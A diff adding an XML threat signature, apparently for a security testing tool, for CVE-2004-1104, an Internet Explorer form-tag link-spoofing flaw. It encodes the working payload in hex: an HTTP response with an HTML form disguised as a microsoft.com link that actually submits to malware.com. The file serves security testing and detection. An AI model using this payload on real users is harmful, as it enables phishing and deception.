@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IE HTML Form Tags Obfuscation"/>
+    <EngDesc display="true" value="This threat creates what looks like a link to a trusted website, but instead causes a form request for a different website.  This can be used to fool a user to visit an incorrect website.  Combined with other phishing and spoofing attacks, this can be used to steal information from unsuspecting users.  This threat is a client attack that comes from the virtual server."/>
+    <Intent display="true">
+      <item value="Evasion"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.securityfocus.com/bid/11565"/>
+    <CVEID display="true" value="CVE-2004-1104"/>
+    <bugtraqID display="true" value="11565"/>
+    <OSVDB display="true" value="12342"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000102a5044f5e00c000a80001003c538dcfa0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726589338906250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X48\X54\X54\X50\X2F\X31\X2E\X31\X20\X32\X30\X30\X20\X4F\X4B\X0D\X0A\X44\X61\X74\X65\X3A\X20\X57\X65\X64\X2C\X20\X30\X39\X20\X4D\X61\X72\X20\X32\X30\X30\X35\X20\X31\X35\X3A\X30\X39\X3A\X33\X30\X20\X47\X4D\X54\X0D\X0A\X53\X65\X72\X76\X65\X72\X3A\X20\X41\X70\X61\X63\X68\X65\X2F\X32\X2E\X30\X2E\X34\X30\X20\X28\X52\X65\X64\X20\X48\X61\X74\X20\X4C\X69\X6E\X75\X78\X29\X0D\X0A\X4C\X61\X73\X74\X2D\X4D\X6F\X64\X69\X66\X69\X65\X64\X3A\X20\X53\X75\X6E\X2C\X20\X33\X31\X20\X4F\X63\X74\X20\X32\X30\X30\X34\X20\X32\X33\X3A\X33\X37\X3A\X34\X34\X20\X47\X4D\X54\X0D\X0A\X45\X54\X61\X67\X3A\X20\X22\X32\X37\X66\X39\X37\X2D\X31\X36\X31\X2D\X63\X37\X35\X36\X36\X32\X30\X30\X22\X0D\X0A\X41\X63\X63\X65\X70\X74\X2D\X52\X61\X6E\X67\X65\X73\X3A\X20\X62\X79\X74\X65\X73\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X4C\X65\X6E\X67\X74\X68\X3A\X20\X33\X35\X33\X0D\X0A\X43\X6F\X6E\X6E\X65\X63\X74\X69\X6F\X6E\X3A\X20\X63\X6C\X6F\X73\X65\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X54\X79\X70\X65\X3A\X20\X74\X65\X78\X74\X2F\X68\X74\X6D\X6C\X3B\X20\X63\X68\X61\X72\X73\X65\X74\X3D\X49\X53\X4F\X2D\X38\X38\X35\X39\X2D\X31\X0D\X0A\X0D\X0A\X20\X0A\X3C\X62\X61\X73\X65\X20\X68\X72\X65\X66\X3D\X22\X68\X74\X74\X70\X3A\X2F\X2F\X77\X77\X77\X2E\X6D\X69\X63\X72\X6F\X73\X6F\X66\X74\X2E\X63\X6F\X6D\X22\X3E\X0A\X20\X0A\X0A\X3C\X61\X20\X68\X72\X65\X66\X3D\X3E\X3C\X66\X6F\X72\X6D\X20\X61\X63\X74\X69\X6F\X6E\X3D\X22\X68\X74\X74\X70\X3A\X2F\X2F\X77\X77\X77\X2E\X6D\X61\X6C\X77\X61\X72\X65\X2E\X63\X6F\X6D\X22\X20\X6D\X65\X74\X68\X6F\X64\X3D\X22\X67\X65\X74\X22\X3E\X3C\X49\X4E\X50\X55\X54\X20\X73\X74\X79\X6C\X65\X3D\X22\X42\X4F\X52\X44\X45\X52\X2D\X52\X49\X47\X48\X54\X3A\X20\X30\X70\X74\X3B\X20\X42\X4F\X52\X44\X45\X52\X2D\X54\X4F\X50\X3A\X20\X30\X70\X74\X3B\X20\X46\X4F\X4E\X54\X2D\X53\X49\X5A\X45\X3A\X20\X31\X30\X70\X74\X3B\X20\X42\X4F\X52\X44\X45\X52\X2D\X4C\X45\X46\X54\X3A\X20\X30\X70\X74\X3B\X0A\X43\X55\X52\X53\X4F\X52\X3A\X20\X68\X61\X6E\X64\X3B\X20\X43\X4F\X4C\X4F\X52\X3A\X20\X62\X6C\X75\X65\X3B\X20\X42\X4F\X52\X44\X45\X52\X2D\X42\X4F\X54\X54\X4F\X4D\X3A\X20\X30\X70\X74\X3B\X20\X42\X41\X43\X4B\X47\X52\X4F\X55\X4E\X44\X2D\X43\X4F\X4C\X4F\X52\X3A\X20\X74\X72\X61\X6E\X73\X70\X61\X72\X65\X6E\X74\X3B\X0A\X54\X45\X58\X54\X2D\X44\X45\X43\X4F\X52\X41\X54\X49\X4F\X4E\X3A\X20\X75\X6E\X64\X65\X72\X6C\X69\X6E\X65\X22\X20\X74\X79\X70\X65\X3D\X73\X75\X62\X6D\X69\X74\X20\X76\X61\X6C\X75\X65\X3D\X68\X74\X74\X70\X3A\X2F\X2F\X77\X77\X77\X2E\X6D\X69\X63\X72\X6F\X73\X6F\X66\X74\X2E\X63\X6F\X6D\X3E\X0A\X3C\X2F\X66\X6F\X72\X6D\X3E\X3C\X2F\X61\X3E\X0A\X20\X0A"/>
+    <Created value="1139461757" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203039204D617220323030352031353A30393A333020474D540D0A5365727665723A204170616368652F322E302E3430202852656420486174204C696E7578290D0A4C6173742D4D6F6469666965643A2053756E2C203331204F637420323030342032333A33373A343420474D540D0A455461673A202232376639372D3136312D6337353636323030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203335330D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A200A3C6261736520687265663D22687474703A2F2F7777772E6D6963726F736F66742E636F6D223E0A200A0A3C6120687265663D3E3C666F726D20616374696F6E3D22687474703A2F2F7777772E6D616C776172652E636F6D22206D6574686F643D22676574223E3C494E505554207374796C653D22424F524445522D52494748543A203070743B20424F524445522D544F503A203070743B20464F4E542D53495A453A20313070743B20424F524445522D4C4546543A203070743B0A435552534F523A2068616E643B20434F4C4F523A20626C75653B20424F524445522D424F54544F4D3A203070743B204241434B47524F554E442D434F4C4F523A207472616E73706172656E743B0A544558542D4445434F524154494F4E3A20756E6465726C696E652220747970653D7375626D69742076616C75653D687474703A2F2F7777772E6D6963726F736F66742E636F6D3E0A3C2F666F726D3E3C2F613E0A200A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
